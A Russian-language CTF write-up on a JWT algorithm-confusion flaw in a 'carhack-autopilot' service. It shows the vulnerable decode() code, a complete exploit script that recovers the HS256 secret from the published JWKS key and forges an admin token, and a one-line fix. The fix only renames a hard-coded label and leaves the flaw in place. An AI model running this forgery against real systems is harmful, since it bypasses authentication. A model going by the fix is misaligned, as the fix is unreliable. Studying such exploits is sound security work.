# JWKS Key Confusion

## как найти

`глазами`

```bash
def decode(self, token: str) -> Session:
    try:
        algorithm = jwt.get_unverified_header(token).get("alg")
        if algorithm == SERVICE_TOKEN_ALGORITHM:
            claims = jwt.decode(
                token,
                self._service_secret,
                algorithms=[SERVICE_TOKEN_ALGORITHM],
                issuer=JWT_ISSUER,
                options={"require": ["exp", "sub", "role", "iss"]},
            )
        else:
            claims = jwt.decode(
                token,
                self._public_pem,
                algorithms=["RS256"],
                issuer=JWT_ISSUER,
                options={"require": ["exp", "sub", "role", "iss"]},
            )
    except (jwt.PyJWTError, TypeError, ValueError):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="invalid session",
            headers={"WWW-Authenticate": "Bearer"},
        ) from None
    username = claims.get("sub")
    role = claims.get("role")
    if not isinstance(username, str) or not _valid_username(username) or role not in {"user", "admin"}:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="invalid session",
            headers={"WWW-Authenticate": "Bearer"},
        )
    return Session(username, role)

```
```
```

Здесь смотрят на заголовок JWT alg и по нему решают что брать. Типикал атака на симметричные \ несимметричные подписи (фигурирует HS256 и RS256)


## description

```python
self._service_secret = hashlib.sha256(SERVICE_SECRET_LABEL + self._public_der).digest()

```
Единственное усложнение здесь в том, что надо не просто ключом переподписать, а надо еще вычислить ключ (ну, то есть не совсем втупую скопировать ключ)

## PoC

PoC не будет, проще сразу солв написать

### sploit

```python
#!/usr/bin/env python3
import base64
import hashlib
import sys
import time

import jwt
import requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# constants copied verbatim from app/autopilot_web.py
JWT_ISSUER = "carhack-autopilot"
SERVICE_TOKEN_ALGORITHM = "HS256"
SERVICE_SECRET_LABEL = b"carhack-autopilot/service-token/v1"


def _b64url_decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def recover_service_secret(jwks: dict) -> tuple[bytes, str]:
    key = jwks["keys"][0]
    n = int.from_bytes(_b64url_decode(key["n"]), "big")
    e = int.from_bytes(_b64url_decode(key["e"]), "big")

    public_key = rsa.RSAPublicNumbers(e, n).public_key()
    # must match self._public_der: SubjectPublicKeyInfo / DER
    public_der = public_key.public_bytes(
        serialization.Encoding.DER,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    service_secret = hashlib.sha256(SERVICE_SECRET_LABEL + public_der).digest()
    return service_secret, key.get("kid", "")


def forge_admin_token(service_secret: bytes, username: str, kid: str) -> str:
    now = int(time.time())
    claims = {
        "iss": JWT_ISSUER,
        "sub": username,
        "role": "admin",
        "iat": now,
        "exp": now + 3600,
        "jti": "x" * 16,
    }
    # alg=HS256 steers decode() onto the symmetric branch with our known key
    return jwt.encode(
        claims,
        service_secret,
        algorithm=SERVICE_TOKEN_ALGORITHM,
        headers={"kid": kid},
    )


def main() -> int:
    base = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8888").rstrip("/")
    username = sys.argv[2] if len(sys.argv) > 2 else "<attack data name>"

    jwks = requests.get(f"{base}/api/jwks", timeout=10).json()
    service_secret, kid = recover_service_secret(jwks)
    token = forge_admin_token(service_secret, username, kid)

    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{base}/api/adminsecret", headers=headers, timeout=10)
    print(f"[*] forged token: {token}")
    print(f"[*] GET /api/adminsecret -> {r.status_code}")
    print(r.text)
    return 0 if r.status_code == 200 else 1


if __name__ == "__main__":
    raise SystemExit(main())
```
```
```



### fix

шоб это пофиксить, нужно было просто поменять захардкоженную строку в начале с SERVICE_SECRET_LABEL = b"carhack-autopilot/service-token/v1"
на например SERVICE_SECRET_LABEL = b"carhack-autopilot/service-token/v2"


```python
SERVICE_SECRET_LABEL = b"carhack-autopilot/service-token/v2"
```

